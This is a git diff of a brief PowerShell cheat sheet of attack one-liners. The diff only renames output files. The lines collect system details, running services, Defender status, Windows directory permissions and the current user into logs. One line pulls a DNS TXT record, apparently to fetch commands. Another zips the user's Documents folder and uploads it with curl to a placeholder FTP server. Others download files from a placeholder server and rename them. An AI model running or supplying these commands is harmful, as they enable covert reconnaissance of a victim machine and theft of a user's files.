@@ -1,5 +1,5 @@
 RECON & GOODIES:
-(Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft > blah.txt); (Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl >> blah.txt); (Get-MpComputerStatus >> blah.txt)
+(Get-WmiObject -Class Win32_OperatingSystem|select SystemDirectory,BuildNumber,SerialNumber,Version|ft > a.txt);(Get-Service|?{$_.Status -eq "Running"}|select -First 2|fl >> a.txt);(Get-MpComputerStatus >> a.txt)
 $a="b.log";$b="C:\\Windows\*";icacls $b > $a;whoami >> $a;Get-WmiObject -Class Win32_OperatingSystem|select SystemDirectory,BuildNumber,SerialNumber,Version|ft >> $a;Get-MpComputerStatus >> $a
 $a='b.log';$b='C:\\Windows\*';icacls $b > $a;whoami >> $a;powershell (nslookup -q=txt domain.com)[10] >> $a
 
@@ -7,5 +7,5 @@ FILE MANAGMENT:
 "(Compress-Archive -Path .\Documents\ -CompressionLevel Optimal -DestinationPath d.zip); (curl.exe -T .\d.zip ftp://SERVER/d.zip --user user:password)"
 
 TRANSFER & GOODIES:
-'wget https://SOME-SERVER/picture.png -OutFile picture.png'
-'wget https://SOME-SERVER/picture.png -OutFile picture.png; copy picture.png picture.buzz'
+'wget https://SOME-SERVER/a.png -OutFile a.png'
+'wget https://SOME-SERVER/a.png -OutFile a.png; copy a.png a.buzz'
